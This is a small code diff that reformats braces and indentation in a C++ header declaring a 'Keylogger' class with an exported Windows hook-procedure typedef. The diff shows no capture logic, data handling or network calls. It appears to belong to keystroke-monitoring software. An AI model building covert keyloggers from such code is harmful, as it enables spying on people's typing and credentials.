@@ -7,16 +7,14 @@
 
 #include "KeyObserver.hpp"
 
-namespace Keyboard
-{
+namespace Keyboard {
 	typedef __declspec(dllexport) LRESULT (CALLBACK *HookProc) ( int nCode,  WPARAM wParam,  LPARAM lParam);
 
 	class Keylogger :
 		public Common::Singleton<Keylogger>,
 		public Common::Observable<KeyObserver, KeyInformation>,
-		public System::Thread
-	{
-		friend class Common::Singleton<Keylogger>;
+		public System::Thread {
+			friend class Common::Singleton<Keylogger>;
 
 		protected:
 			Keylogger();
